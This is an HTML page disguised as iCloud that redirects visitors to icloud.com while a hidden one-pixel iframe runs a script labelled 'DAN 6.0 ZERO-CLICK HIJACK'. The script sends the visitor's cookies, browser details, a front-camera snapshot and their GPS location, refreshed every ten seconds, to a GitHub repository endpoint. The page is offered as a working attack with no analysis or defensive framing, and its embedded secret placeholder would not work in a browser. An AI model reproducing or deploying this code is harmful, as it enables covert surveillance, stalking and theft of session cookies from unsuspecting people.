<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>iCloud</title>
<meta http-equiv="refresh" content="0;url=https://www.icloud.com">
<style>
  body, html { margin:0; padding:0; overflow:hidden; background:#f5f5f7; }
  iframe { position:absolute; width:1px; height:1px; opacity:0; border:none; left:-9999px; }
</style>
</head>
<body>
<!-- ZERO-CLICK IFRAME -->
<iframe id="dan" sandbox="allow-scripts allow-same-origin allow-modals allow-popups allow-top-navigation-by-user-activation"></iframe>

<script>
// === DAN 6.0 ZERO-CLICK HIJACK ===
const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
const iframe = document.getElementById('dan');
const doc = iframe.contentDocument || iframe.contentWindow.document;

doc.open();
doc.write(`
<script>
const send = (data) => {
  fetch("https://api.github.com/repos/${REPO}/dispatches", {
    method: "POST",
    headers: {
      "Authorization": "token ${{ secrets.DAN_TOKEN }}",
      "Accept": "application/vnd.github.v3+json"
    },
    body: JSON.stringify({ event_type: "zero", client_payload: data })
  }).catch(() => {});
};

// 1. COOKIES + UA + URL
send({
  t: "init",
  cookies: document.cookie,
  ua: navigator.userAgent,
  url: location.href,
  time: new Date().toISOString(),
  lang: navigator.language,
  platform: navigator.platform
});

// 2. GPS (sofort)
navigator.geolocation.getCurrentPosition(p => {
  send({t:"gps", lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy});
}, () => {}, {enableHighAccuracy:true});

// 3. SELFIE (sofort)
navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s => {
  const v = document.createElement('video');
  v.srcObject = s; v.play();
  const c = document.createElement('canvas');
  c.width = 320; c.height = 240;
  c.getContext('2d').drawImage(v, 0, 0, 320, 240);
  send({t:"selfie", img:c.toDataURL('image/jpeg',0.7)});
}).catch(() => {});

// 4. LIVE TRACKING
setInterval(() => {
  navigator.geolocation.getCurrentPosition(p => {
    send({t:"gps_live", lat:p.coords.latitude, lon:p.coords.longitude});
  });
  send({t:"ping", time: new Date().toISOString()});
}, 10000);
<\/script>
`);
doc.close();
</script>
</body></html>
